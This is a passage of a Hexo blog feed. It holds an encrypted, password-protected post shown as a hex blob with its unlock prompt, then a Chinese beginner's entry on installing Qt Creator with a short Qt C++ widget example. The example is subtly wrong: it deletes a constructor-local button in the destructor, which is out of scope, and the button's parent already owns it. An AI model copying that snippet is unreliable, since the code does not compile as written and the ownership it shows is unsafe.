d06ee55160a1ade693740f2605b1cc17e965fc55a7f570133bb635436d17c4b29bcf45aa59e0e76f9522e5581d7684057375c387d32fbe6b6ac8dd1cc8a8107a3e246ea07379ba0db1bbcaaf8e60e698dac39aad85a296f6162f5b26a25a701bbaad6f5ea56e77537d3deb2d14bd9375e79327bfd59fea0b5e04c7479473909a7cc7fffbac8252e5c0e3287f9792f23654ff419f6c9c3aa5ec1ba97b15b6c23023d1b0501c6298f51352b6ca66cb08792b615202eb2f9cc68efc3a49d1ebf9d1113ec78ee800d7cce613f57d5b48537a75daf088c7f2282cad3f748c794cf0b124ead55f6b479c869962ba4a8268f62fafed3dffe5b52a94746415efc65d04bd9c36f32a6a13d0a651840622cfaf29ac26ee5c851e7f21a124df46c09b41469c6be81b2e32fd9a1e2f1c07c688d8c6533d6c5a3fef5be4966ce6288734525a3b7eba9c077a9f3b67c9eae308e46a56e8b1a4eae4efb974b0879dde3c2cc97b6677517ba41b2d4f29407b0c13205794a1d35c4f11cc84d1f60c22b8861f75664425ca0da011ec015d167ecda511a44e13c83647de0ab37beb6fbb387aff15144ff9f0e91af5b8a6d04f145c0bfa83e1ea8a969b2a023bcaaecd457e7325d8ea193ba906e2397abab7abdc9a0d938d8393b0a508344b97a5258f3c409dfa3b7c83110d819df3da6adf24775e25b7a1837d3037dd2492139cf4adfad335c3b180f127237b1f41efe07f69dba048041e948c49cf9cf5791a77b5346baff24f3a71e164f054071143344a5f25fca6a7e8778ff117dc724aaad7938de6863602ac1521e7afae4eca69ac98489e4fc8a487a3cc7f71c886906969ca86964fb3843b6ddbd22b2ab98bb5933fef43a6d589c816ad4e6435d9cf8a6ac26483a83042367d57e2bfb9d8fa820d725084700b49c3443d18280db06d81f45abba85d84a8494058514d34104fa51348fb1a61bd3d41d162c759c9686014503845628105c8db0dd09f4bd6e1a19dd0eed612d105cafc22fe6c4d9e1e69e94782d2c186e61bf47348ce39b4d8f0ca597636a1d2820edbeadc072f03b554b53a1442eb08a483ed4d8ac28ca291ff01503299090531747ee118c068a38f870b8d9c165bd306b479a2ee14cc856e9c7f33827c2917b8eba9454d06ed2641c1db05b57a419459388295eaa8cdfc546000091c5099eb1ad6097a360fc638ef3a05c105cbbd84dbc7b147e6b847a21ba2538f80236ab30c35838634af5559ac192c268c5c65117c4e65fe29154377f1e1e9ae0ffdf1da840cdf3273661b4789c2edbf29a6b3e13b9ee5ed88eef8302e2eef15766d521aed341a7c4133d7e125517d1511d23da84538f66a7e148b9d4dfb7a78f606a22758225618c5659ca4f599db8e5a0648c24752918d392ae035f705e77e47c1bab6297413f759daa09bb6267076e97c5cb3f7c099eaea6cb2c143ac64d1ad93abcdfd3b2a3c967a65523b4e148a7b72bca9427c3bd145bc637d598bb0be3e071e11a7c71f81505a464e449b33c3edfd60f965cf7292c130a5434acbbffc0f34299cfbbe4339a743311bde5dd3544f8f0672a6222d6030c0e750be9baa0b64137b219f72c6494bc251ec00687dd155cdcd5ea3517a503bcbfdaf04f4c6153726f4dee0f4c34772a601d88b6ec851588ccb5336cbd56169959a51d1cb30bbc0aeb684e4144aedef04b61d7af91ffaec5ca1d38eb3ce441a4add1d02e329977434a54be7e7d73b78436e4046a1ce1ca389178477fce136839247d667706b2ebdd06fc3383ec98b61cd08ae49a2fad3a13db03030e1b158bb9fc3b57635050f1513e3aa92899665d7a38fb32cc938680cdd0d03be3dbb8dbfd9422af9ffdd85e5ba1361d40b868868b066aa899a2f740808c13b4078392ca476faa2fbfd5d5a6abac86c8f2e05e02bcf4daa735b763a901eaae91c849fdbf37f478036a76c21cf8880a9ee8eeeb38557d80bf17bc32c69b7e11ab5a3cf4e94083bd15d9167138205104e62b8c3c872dbe66136915984425dc64afa9abf0dcf3448886d92d3d95d3fdec729ca51856d1e9b7ed1eafe01a10fbf1175e3df05418c19c7940c491440bf58363d4f1a06e73f52b1698a871b8a9808cc03e2313963bd7ea2db94c86e9ef13c7ff0ef2c032b2aaa994817fe289a0f1c135b7325f0e2e9664f20588ebf9b9ec983bbd5f22fee6e0cd9ab90143951ddc0519e4cd65021306686e166655e1ff565f84b2f84ae947ba981dc653269cb29de88e2ccfee5e1206781ae9ceea12ed5e95b589090325ced29e9bcba9adf47af1fec04c6fb3510dc3e3c75e46da37604471366a9a0afd41d3d9f7eb36a03dc68ff0cbd9ffc9d838770a92250f98788db23c517b716c7b3a6b07689e236fd295e62ecb5e38d9abe16c0eb7d4de97b3a9e2f95f43fe91f719c80da7d649fea278eb1d6c3137a2cf274d8fe1518c540ea55f72237705516d2777cb407e6492c934ac366cfc3c741d3019cf6242c9701ec45d413d125b2c5be8471eba97244dba3cf98eeea3bcc5473360a6da94de77d6349c520d85f006d22924330d7cf2ef744ab99536c0f1276127651dfee3528680ff24edb020994bd6a8b24f50acb4ce5ecf8dd990fce33c80075534f42ef071bc2576ac879feeb872ead5bc1dd6042be5d3fa83c8de70a8ab03389f17aa5a8680a816f420c9e0998dfbac9bbc516f93e4112226a0553fb7ad6038a3321eb307e0eb9176debc95a16fb8ad6adaf1a870d7ce272fff8a21a391d7b833ac0391ea2aa935c402f94a07003e878c63522a45ee4a1f088a411ba0db1f019b3281feb59e98435158b82f66b36315d1ccde6e2df458bb44315104915c176c7c704cc8e7cfae9a14a5329b5aa956c94b81bfeb7a3529ebf46143be662cb294e463313d82a49c27056153c54bd7bafc52a21d6eb3d3938eb4c3bdd3c735012b64959ab9a001fa249bdb01f908020d37d112a8055ed0cf8909778e544682b9887b455e8c936500223e2b44176301f90d87524bd48086b01fc7858e75de00806048d23ee612562a3aa5c387fb9c3aadc164edf11fc0086a8dcd6c4f0c422b3cc4576ad8befac573853ccc4fbd7c69ae088b871a60b51ed91a93a01a509d0ce1f33de705b272cf21dece7951b729fbd6fb55f6721aa9cd78833398fe6410ab8d7ed34b9fda1fe6d06f22d144cc9bc8a0cfe7e8ca8d9e9238d77f301438ca37b008b286fb9973ce6dbbccb68f9ef3d84c593054d12b4b86611d32746ea82ebc5d92ea3b4cc68b6cb29cfb3cf775122b5e56a90269a6232d5921fb8b7007e5cbab30b72e5c89ede2a70304dbefcee77a5c228cec6309568cc158913a8ac8977e723cf57e271c14b5c2d72b05b0d1ca00443c52aa6b1f68abf6ba17d1b990210cfb0c3faa4e8d59a7e65beb0edaa3c7a0f7ba24940ac01265800ae76b8d92a26e1b1ee6465055e56c57feda6e7c04ec1cd118a1465bd100d4767ddfe4e26e84646a42832782f8f6587237fca31e9cfa903ffd1f5e40468119a7669dbb8465c6bf727e125da1e523313ee6d30f00237d3293f91d8c3a1d6ba1a5c6424f7004a2cc403efa2e9f94bfbf803dd8fa67f0531b6c329332dc4e6ee9f1fab7f06d96584003cc9dd41a3567d36a66cbc2e1b3734b32eb3531ae80fc6f75eb42edb2be3f30b8268f6128e5fbabdde27191a068521fdb5e901bfb12face0f5c8d3c91aaccfae241c973f8c98a39dc87aa5281d0bbc82175387d86222944b7344c9e13b33c75488c4216b75db970d5519a865f92bbc29c05a0523461725dc6f87f91927ad62ba9a4d7d09e79f33af391ad07f6fd78a3919f6164d8d252e79e466b98e2a107d6052142492ba4c8866a49e45aff34e85809d78251fc63dac555c939e3d9d73d842a9e18b1c9e16401d00b8733de39db82af8719c2c86cd94285929fe4182fc99cc4e4dc068091ebd8f9fc977283e149272c9e060ab8e8eaf1b795d168247b658fa828eb4d038e2a1800b9495ec899aaf197556ab05684f43fa4e6e797bbf833f19d36b803c4f6813260f3688b89e669001d06569e3ca77be1d557c749fd03756a9f15694692ccb3180148bcb7db1d9e1b795bd1d89f71a297d173d69db256b65ab7985f15b7497e155e8add49e90c755321e90b9638502abfd3838f086b79b9fbf23112542df6b52fcf653bc1adea2940fc6178b37279bd1a87d690f1d1afd873c9f8c5bb99f0e2b63ddd90b5b08aee8ce646b17e9b12b47ead66344fb746f99dfe3e3e91a6aea89baaab9cb625b34298ad114525bc10244698e8ac27af75fc24f9b967959b42870ecf6be0a5e2a7830f13170b78d5cee81e6c08e1677688f238575031458d211ba589a01499b665c32fae7d07a245384de1429891ca181518bc30e7e2ff2a3389e8721ab37faa695cd63acb7d805f52896f466adf1e4e5597c8079f75e7c8302dc6691aef52003b843cf6a499a27fbc8ca697fa1298579ade1cb53b9d49f80f9a4d2808a05cb71a7ac43be8b174178e40bce1163f056ee41c96d1e294bc8cae8d4e2be38e2e5865fbb391faf042a3baa1f6e3cb7cc2ef5b155d640339def4ae98ffafdbe1b25a792b07eda37c3818c27ddda65b93b593f40b54d2f60aff753683ed3d6d7800b69716a77686210dcd89eaac8cb13a2520f2cb508c54a897d5ff3e1de7d9a01d0438f09c89713735449965f2cafb1f263a359411af3f17ac0d105092f188e695d26c1598ee81854f3404b1556c931600c78b9c0ba408b2c773e00323153af378e390e50c791d810b7cd30caef0049f9695541857d96b2671f22634ae46a74bce61dba0701c3877ee6d7c7ff1ac8b9f3e9486cb34a816f40e1e1b9a1ba56b44c4d8133bdd855cc410ecfd07dd78c6de440b83fb4b2ed8e1cc031f4514d2f4977e87107d17d2ef68410ca39c9b40c90b1e7ce2c4454a516c86472cd576f4dfe556af7fe790b7403dd123182e72bfd4697638135d3fcaf4b525398986003f599c37034e1683f476192f1d6fe04bdb9e16d4b5eac28862252ded6dd5613ad0ac2c12ff5a2a7d0c7da2f9736f4d0c92b004076ca5f0934916f6150225e9a8533dca6b37c28ded1ca13d7a657ffb4648a9d10ec7d56a2d14e15af3c4959cb1822a9a0ea894b751af141f6c832539cf5860084601ae399dcdbf92ec5327e8c38a7a5fd70bc4abaa829d780d6b1d767a5065cbf296bec65d49c8739aec42fc9088aa64322d2978aaa7e706fa891fc340c39810c60c881c26630122f5ecafe920a003d3f6b47271af88d344daa922aca70476553a7cc110b44512531cc5346b32080344609c7ec8fd5bc2dcbdc66944053dcd7d164c5280e219207d0234d95a54de71fd29b1c37c443a3be312c1d8286503742c3e013a95632791559be5b54cf28a1d893bee22fa4912a1e5e805144c6e95d27497dd7ab574a8bebec508a3ba3fff82101ae3d15ef46d9bb01292788ab042c080479c5afd28b45624a024e4e6c186e77ed07a2bcaf89bfbe9c95e9d684b37d668083b8694b29738156cca182861ea49f2d112946645b30c9f2e57cbf8a345f39f99baaa1dbdd6ff01f37233bc3381fabc3aadb959964990772c2cc80352aef7a96465b080538fa8ada3272681340dcf6ddbf88d53e57994601a9c6716ea81895ff68f0f6c3344cf6b1dca1379d97f3ce512bb1da4344f0101fdda17d0b4c4c274ae89cb3e38b69a954d8a2d9bbe4db694a736c98d4dbccd2e9e871db442406687642a0061b18b6398934163be1c7a659070da36e53ee1d33d7d7f83ba5dfe38c824df1b0879da8810f92825493c6f7dc67e160eb792e9ce943edae438f76136e651a5602611422d274ca074ff8482f916ec319828149155829ee90682191cbecd0bc14fe26f5cb058c4cbdc90d2d8b3a5f1842d7bd575bbf8f2906cdc88e162967b16173549c3db5c79e2060fd06b520801197ea0e7234fa08ef9f32f00ffc0796dd84496ae0ff1bb72507502e86246e2e31766d04363e9455175a73ad2b66625bf096b436fa0ba620f16088b5a69e9ac4c7d25a62f57b60a88951dea690d3104f4c17cfe406dd2b29ba4921e1c5b424526b6a3ad6eac9a3d4a0030119a073e585d2d4ad4821eb1c2544eaf9f9b2daa9b64b8605fdf95c3f68920396b011e2d006e04b84dcfbcbce2d23491aac118345f9a37c6e2ea8899e55d3a036d134ca21900983dc74ba02b481127c235fe1e4d15229d56ad1b2c8fb9bbf10c5a05efda0852668fb86175adbbbe3751b8062e651ee6ecce5b0697ff4cf1b6738b281ed9bf90a8b81fd60a5bc5a1e77a24b17123901271f99b45c7176f981bd08c415fe0e58d3528187a48ca357e6fc9dfb63c113307f7f2adb02ba8b65989006c7755523ee435b5b6285f64c89c00ff38dd6e21f39ac71a24acd7d739269b50190c5d3547d06388d7c812b01aedb26f75f5c39c2ba297833152ff6453c864c53a7c981adab32611ab780e35c1c237ce41717fc80efd1dd387bc214d2a5a04bfda49088218410950c8f0bad7cb3c5aa0cff943e14c6c4d21fe03d51621ae53a518ad02805829df37342762642061d8053b13bde2769c4d3131dc25a759dc75605abfeca286ec2ef5bbecda8cc3b82d254ddaa45e1f7c65f9a74a722f2a73fe00d7602252fd8926c8a206c2d512be14e05c4724a542e99ede5fe1773111e0df86138eaa849d54aea914a816dd4dc5dc9fdf8430628bd7b9b3103ac45386f1c42cfb51991be2096d2757d8f6869a60743238df245bc41598b799162467c55248c93c3cccc6888f21574a6512fdc60fc3057257223678e29dfcf860d7f27d5edfb5c766d2b5302c71b0f9df5dcdaf450ee81ce96cfd38c2eb3f332b1fcaa0b3346fb288352a59ed0c79af1e1df61ec849796b4f30d76ce1de440315e9a06c877bf6e5e5adf2e83b51fe956c7eb14c80fe84a3320ed83a3f1d7187474505c67695244766e93410acfa97a594160e666cb521390ac0f4c2a702b4a6c9d0238b59b55624c449eaaaa2fd431a7ed1ddc2f1f2551e08ee4f99c52bf1f64770c1ff12b09ae3ed3905770c7f5d91a10660a85183ae3633b9177fea6098fdf0a5467b6aa0e7e60fd3a40edc4841aa130b031a694142e7054db0dd2a7026978061ae267e8cf1d6db4a4ca54cf3518708b712ed55b8ba3bd82ef6cb1aaaf647169a544b85b185b88300df47030038941b2cd1e8eaa2696f8cedba39c76a5b299303542ac0800ddd666f0ac43d0c522ca5e9ae641a90cb024e51f5f6d3429122fb175aabe827b66b00ffb5c576afc1f72ab52ca6ec4fd5210fc261e6d142b99300070c2cb88c6fd3132ac4ca9dc78a30f89af6e9405192f83c0101ff57c495154097901493d44d9c0a2791ae310e74ffe703b4a67b18151a51410a7a0f35abcae1a2a8ddd5daa0615e41d6a68d0d3738f2ef3dcfc2d5ab740776c7b588a856214ebe8ea0d3ba4a781f1832f95b1d4c858984d2746a09994058db01f4547cb01c2004da6da30a058bae942846b577c8408444daaf4eb8d7c353a40fdfa9a58a223d916b8014fd13325a9de751b87740889727164ce057352e435645d414d15e71e45247e981e1307d83ee7390fd5138bf9172bfc72e84c64b5d9d524f6ceb3c87d8df5f5bba373bdb164f7373310bcadef35a96b15f663cb9090063116fbb168c8839b099de39f33873354f9d837e317b46e136e9e1209623eda08f114f07d60112633317564f0ae25f0df499a2eb56e744f061e5d8cf9c47dad570b69302f40ebb51605a106f18178325fa42033d65fd1a423b49eebb5a8f48e2228eb77977bce23d2c010223bf748c752541c31cfe00757939fd1ed92a61f267e640183bde54378512b0e382d166539398b2b8d2fc2136b827eb2dd757b61299131c58732addcb24b52495beac407ac801089de69591bf9f474f34f2a10104bd0efcaed980e691cba53e0a7c20e98787b5ccd2970f375c7117eb34526427cd619bc0351c0e81b266a82b5f4eaffa5bb1f33159252f7b65c2bc5f33bb5b5e46fdf6628a3eb06ba6f55b8ae320b8fa96af6c89b08cf389155a176d61442c9f0f1c54a91f487f08acf2c34e7d290ba6ba0b93bd344e2d2593ab3e80cec6153a0a4d8e75b51fbc624b3fbcfda5ea871b61930894dcb3b32fd8f5b5e46974c5bc8283d30fcc18ef9c911a7da94155490ddbeb16c2c65296ac82aa4ad19e8f09d24d3d3e2271cbc1a45dbfacd359a42570ac95b9bd3be34e89c70a001b4c48a46073ad6e182485e892a7f8cb3f61d6012d4882fe9ee72ef368277fdff931d5d39aee4a0dfc073f480168b9292e73c14712fa795dee1da53d87f9e2f4b782226ac86e64fa46510ecc95e783bcc3b6363b216bbac330b3e703c32077a72b4f9626723e00dc56fbec1dcdacab0271092f849e6f34861cbc3c01d98ea68b5cc1baeb43c216e40e896a0b51707362038944739f4665157d1f55a442daaf10b8ac353fe65aefc1e7361939197d776aff9e37333eae9127ce90d13279d22caaf43b64f17da63d2d7630a3ddcba3733361b7cd176a26d26d2fc13d3e6490b23198d0ae1c619565efe0c76b285dae3f59909423aad6c120e43359baca520b4087959cbc58328029ee39213d4765424d10f687707c21a686d68c3f1e1515f3bb86e414b1697c1a1ac83ad2557631a537b930d3a3627c7e4a318523a35561f791c282a385f198475dd50f78ffa5cb6d0bc4b236061077fff77beb547a02d408592b598dbb8fa3ef169901def4be5f7031124bce1c8048fae865d22d9948bae0382aef101659d7065cd392a89b44cb902c9525900d4f1313834a011aab42d097afd686555e200371506c621b305223fc23f7573900de77633b8cf8c423149d5bd124703e6b1818b9c0790d6da8a6d77927b8c9609a9ae9dd69546ce9b1d4ebce6ba53a2ba03e6fc29f8c8191f66727476cbd10645477f4a1c89c2bf63c5137da1bdf1a537c544f2ea6758b46e909f0187182dbfd047e701196e069ef784e1470f18df5e8970ab67480c6a5ea687db53c6bf6731aab31e61c7905cc791fc56e916c1a615e6bd8e5a8a517f701be2af7970152d0158b360e9dc8b39e29fd06e483d5f6c94f10f5770ad97cc69d172fafc0b6c63ad17ee5cac293f187ab7a7a8c561a04e4dc7e460bd15411fbdebf277446e9797a91b201cac211025b54600b5a84b622aa9df161b606924d804e3fe257b676ad81ebd8bfa8816f33c84ee7c6c9cf4bb824dc6998ab8ce66efa53115c135121dac4d11ac7b67777f989a1da563f992ba79233c6c92bf3a2b7bdcf65c0a84d72742a40f9b5658a8139ffbbdf27b3d8af157b218747e5086869231555c4ecc7ffd315baacc513b4b0eef06088ad34a1f99a6a1c5c2b69b0e648445a87e4034318937b684b365d3082171455875177db8e1bb9183914171baecf8e6c493fefd47ae37194abebf044734e40d55bf275d50e412d67a77451d13c82b9023dd9c21489fec823c2ecfc214c47bb8c606f012845e48a607d1f6414464f13d5e85af3e13140ed868d94fc808b651e781caf3331d1e11138088c8d065f54b8ecee5a72696b505c6bbe5ab5432eb4ede835e9f7d767d949c12911de36f7c2b630de758cffef115a87ab595cf6c19fc0280c492a48c7d2c432d27a58c407afd28f2eb15910ce9016f056499e0047a3ead32e95e0f0754f561271b967536c384a294945e8d3261ac431cdf706c455b7e2dd96b80da3bd865958d6c0e879b391e7ba0d2a670b19b8f9ba1990c3eedba2c0cd7e4b65a30193598d6892d0ad915e2694accc6ffeb955ca09d86841c5d9ca8c37487fa05506660168ff2cde45d0bb491c7130b450a0326b142918c616acbdb8025b7a8de85faa04398b95654912d383a88c4b3f2c98307f905e11c677bb66a4fd9ca2c7a604cf229de345a8788686dae00358735657ca4d2087053d05c7814f8748053e87fc3a6752eace1163741e1383ad1084f9f420743d3fe23d676a5d2c6292356abc0047dc849f7a8b80ba9f89870f62c331c16f87e2791a6e113f324910a2ae2b7be81de47d65ead6ca3bc127381b87e30ee6ce8d1e24f191534e1976db44ba3e60061a381f705933abea589a1f6671a7a31f6fa864e3b43e13852f4775fdd4c305981ba073828f1b24af42b4a790d32e53a700f9b24b691c7a52faa77885eb24d8aece825a265ceed7b5ced221eeafe13f168cb7c6b17e54e23bafd2cb57cda16b3ceb37a8f1daeba32bf2980717c4cbaef6839572e1d7792fd366c1fbccd00aa4ef387890de9541eb392a90b02504d79a0acff97b26a2451935ea5e6fd5a0120352143c0e03cd11333732b2071d1722071122081607b246d243a592ffefcade6d8d30e138152d2417874c4b4fb5b2477bd47edd5ac84053e5c228a0e589bc91b29f7a8001aae4352b77c2bb9a238e6664e3782529cf96a72073433bb1b0fc94e9bad11e17d72840d758f3c6e62a5744504d3dd38081541238cd71f78c38f5c76668ff53e033177239795b9ab1496d6870eb37d924f64d52c15d1128a84712e52f668f9af33d038f9bd8784c66482015900b0a5722adcd02f6626fd403db51cbc4a48a9f27102b5d4b2fcc68631a45a91e4ec6cb4750d5131ee68bc232061834cf7d9abd84cc0d94cf1de9e18b1feda84bdeb69e1c1e6d2f98216ac41edc8330543e4edb5fa1d5d51a84a4f798507867a423c4dc9db0df4ab93ecbcaa6a8bf7ad255d6d8cae2d849f939d6188de273781de3d94619cf31f45f3045657c75cf97410e497e3de64198ae81ae6f820c56119c6bbe34b7b8b8f93bc038a436063c1f18a420a7775334cbd876994069509993263881f98014e02866e6f576bb376d25944f26e830b1ad7bef7167d63f88367ff816b231772aaeee98729f5709daafcf407e2755866e60105ba1a6e6456dac5c06ce874ac4408b4a37e09167698fc01f1e85137793c93d9f218c77868695a1bc7055b91c6b8a3f00373a1c642b2b232731c50d9defbdbd1d90a204f3a538ad449eac88c7a57b08c3827a2c257c8c1c04bb6792fa470607d4e574c7abf07fc67a774a916b52907cbb22ba941e5279ccef97bb0ca2ff9840a6d8b8a7176bfea5a11509f81585779e5a589cf7faea4861298466c4df284edb0874434e734e227545fa82f8ae5133ee633021a0705e3f602de8c0104e0f80356f155f8df31e9c9ef7de6a2de00207d87029feec397b3aed98b866e9e534e627e9d3ff45d92ecd54b871d782f155c74f6f9d16e9de0f33c3abee858197380b426dbae93a5be9631091e4f1ea4c85b6bdf66aa0a24aa4120accfcbfadd57c7d8db3f488aac2257b11b76d9d9f7c0543b9774eb086acdc27b7ee22adaf7957bb21008956894757959c5aa305d49c86f160087287d60619cd435916f77a41c600cca9c928a5101c55e1e8bf6c0ea9ed68ccc679262f7e3b68e3e4c9d7568e41780027c4337bca469a5c458b7293296da99e9eebae3ed32fb3875af9cd51dec421486c28372f793ba8a9ad558bcb81ecd68365e8fbf7afb5f24284e92e9537d2294047e317ebcca1b38de7ce540ab7701f805289d985cb7b28c33d2ea7e7015422eb02d3c1def8ce3d84b96caa9c15659b7198d2d7dc716065df6ffeaa9997845475c23067678e866b51e171b999cac0fe873b54974554baebcb4033fe4f8b7b6a82da8ab3c0317a7785a5e9b92214c9caf44485acbd6db0d53c1f44d07f3a77b12f94c6d0e4e02298415d00e22243054facf70feec469a6e9c09b94bff44a46afe0cd36fb9356ab3859224266f9d418382c8c1dba36c980eb77fbda534effc796b4e5793a4897da34ab8efdd6e64ea52f314f83c6898d75ab5864aee529fc49842d5551660621b2bbc1f63c2049ff2cbc4bba401a9f82d74f7ac361330037c86c72f2f175eedac8df6fb091f580878cc3d53827103adc3a86a31e0de464139ba9b4be8e5ba1968d78b62350b0005f0723d75b3caa4f99892742db9cd75a6fcb9fb2c8ef78dc3988ace9c0b698e6262bc974fdcee15178229ae24f9ecc43e0abe2f05bab49504eda4de7ceda9db9efcef2bb0c022ac4b58c7ea744d24cc104b3ad6c78c6d9dfd3281b2b9e8b06eec45b5fcf204a27b7583cf5f23255fc332fd72c295c0abd26b54ff4e968bb77cb9d2b34cd247156aab0aa462021bca79837058a4222eb031d1228b47073343a15d587aa78d19a6d01e60ea5734e86da40b81a18e21435b005b804b85426d5d6c7879fe5a7471bb292a796051a1c732f9df887e96f7de74e27f9c74c99ae16b90ff6433b146cc1be23cc7005a969d9345bc934511f04f10081d6e2c861c6b6b200eae38cb8450daa1dcd588db356a4ac6a0fd9992afcc5ddeef9da0c282b34886e2bdf81d97f4a237f14cd06eee88826d7c003a6a6a5d572f5ed0132056775a12a3b294f85384b33f5f7289737e89e55fe34991e36e5667849051c2fd80709f83ddbd50805e70532945019edeb031be03e4ac2f30a4f058ba9925c98bf64ad347a0ca8ac570a7a032cc749bc645e7b7793812eb9c261360af638f6e4e105a88b8b3f84c0a99143a710d4dc6730d5c011b3c50d22055aecd6676fa04b5bfb5020cc915b1d721e904451d47bcf4b41a2c89fa3fdebf2175851f3b2264271f3483d2421e3f19baf509901891179b2760c3e8e94307a7950997790eb63616d0abb9149ccc6ce52d855d58fdca1f679c748863b6dbca3aa7aada5050521d4e6867efa0924ae6530b23f2cb1da1e5423a4e74e460e5da45d8a7ffbe9b26ea355b35304f5c9de16db77e80d0da40a71b1974aa6d77fe0b9a5e02ca3ee622bc9a0626b59ab1049ee5c0a3737e17089124e76e67312c50386a456dc6dd0103308966fde3d2ca44f981c9cab51d64d802eea1c2c579bf97e20f663fbd2e0b7e25d7bf1bca13674e087027db4e9ffa44af2cde24d7a0b5193e4105683d55f958aafc2c428d599d97875e62ce0b88d67b4281f7e39996ed7cad67e963fad7309baac66b968a5e06df7c5f42e3f7f11add894637709b71b35881ea62e694a0f052c74b6e3a0152b7314a79fd52eef4fb0026c2bac490db154e0d5d0a9ee11842f15814e4cfc30e91d890066dee66ded60d42393af490e3f5b68eece473b7cd65d4200a11ac3eaca9baf0bdd34fb775eafa13fb0f000a15371b5bf0e1dc0bf2a4c27e517b4615e7cec7ecc690082cd9b352c53dcaec36fe2d36c46c7e36c7fc29929da78</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Qt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】qt creator</title>
      <link href="/2021/09/06/qt/"/>
      <url>/2021/09/06/qt/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>b站的cpp看的差不多了，得找个方向溜溜。因为看的是黑马的，所以直接看看qt了。好像最后是个翻金币的小游戏。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><p>我是从官网注册了个账号，搞得开源版本<a href="https://www.qt.io/zh-cn/product?hsLang=zh-cn">地址</a><br>下载的话<a href="https://www.qt.io/zh-cn/download">地址</a></p><img src="/2021/09/06/qt/020.png" class=""><p>实际上也有别的方法，比如在清华大学镜像站下或者在官网把下载的连接粘到迅雷去，因为qt的服务器其实还是部署在国外，没有科学道具挺慢的。<br>我这种方法因为都是下的最新的，所以对部分人来说不太适合。<br>所以具体的安装请自行<a href="https://download.qt.io/">百度</a>，百度的教程提到的是分开下的模式。</p><p>吐槽：</p><ol><li>qt的界面对高分辨率显示器不友好，有的时候不太正经，建议下.2的版本稍微好点。除此之外就是两个不同大小的显示器之间切换你就懂了哈哈。。。有些地方不按比例来的</li><li>qt对中文支持很糟糕，尽量避免使用gbk，不然编译可能有点问题，最重要的是安装路径或者文件路径最好都不要带中文</li><li>官方的图晒得都是配合mac的。虽然我在ubuntu也玩过，但是感觉也就那样</li></ol><hr><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>作为图形化框架，当然也能开发非GUI的程序，qt拥有很好的跨平台能力，基于面向对象，一般都是用cpp或者python吧，貌似有Android的支持。暂时用不到。除此之外，qt除了桌面端，对于嵌入式开发也有布局。<br>qt有名的例子：vlc、kde、virtualbox等。<br><strong>注意，咱要用的都是开源版，所以发布的软件一版也都是采用开源协议的，貌似有能闭源的，但是我对那些协议目前不够了解，不敢指手画脚</strong></p><p>微软的mfc虽然也是一个良好的图形化框架，但是微软的尿性基本不开源，所以mfc只能在windows用，到目前为止mfc的项目好像都是老项目了。未来究竟是什么样咱也不知道。</p><hr><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><img src="/2021/09/06/qt/000.png" class=""><p>图形框架最经典的就是拖控件，然后设置id，参数，在到代码上设置。</p><p>除次之外，qt的控件可以通过引入头文件，然后去创建，一般好像比较喜欢用new，然后在析构函数释放。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;widget.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_widget.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QPushButton&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Widget::<span class="built_in">Widget</span>(QWidget *parent)</span><br><span class="line">    : <span class="built_in">QWidget</span>(parent)</span><br><span class="line">    , <span class="built_in">ui</span>(<span class="keyword">new</span> Ui::Widget)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;<span class="built_in">setupUi</span>(<span class="keyword">this</span>);</span><br><span class="line">    QPushButton* btn = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    btn-&gt;<span class="built_in">setText</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">setParent</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">resize</span>(<span class="number">200</span>,<span class="number">250</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">200</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Widget::~<span class="built_in">Widget</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">    <span class="keyword">delete</span> btn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img 